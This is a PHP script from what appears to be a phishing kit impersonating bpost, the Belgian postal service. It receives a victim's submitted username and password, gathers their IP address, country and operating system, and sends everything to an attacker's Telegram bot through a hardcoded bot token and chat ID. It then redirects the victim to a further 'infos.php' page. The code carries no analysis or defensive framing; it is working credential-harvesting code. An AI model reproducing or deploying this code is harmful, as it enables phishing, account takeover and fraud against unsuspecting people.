<?php

include_once 'functions.php';

$bot_id = "7365575342:AAEgg8vKLSnmt3pfdd96nETNLJ5WrbC8vJM";
$chat_id = "7421525298";

$json = file_get_contents('php://input');
$data = json_decode($json);
	
$message = '[🆘] +1 LOG BPOSTAL [🆘]' . "\r\n\n";

$message .= '🚀 USER  : ' . $data->identifiant . " \r\n\n";
$message .= '🚀 MOT DE PASSE : ' . $data->password . " \r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";

file_get_contents("https://api.telegram.org/bot$bot_id/sendMessage?chat_id=$chat_id&text=" . urlencode($message) );


 header('location: infos.php');

?>
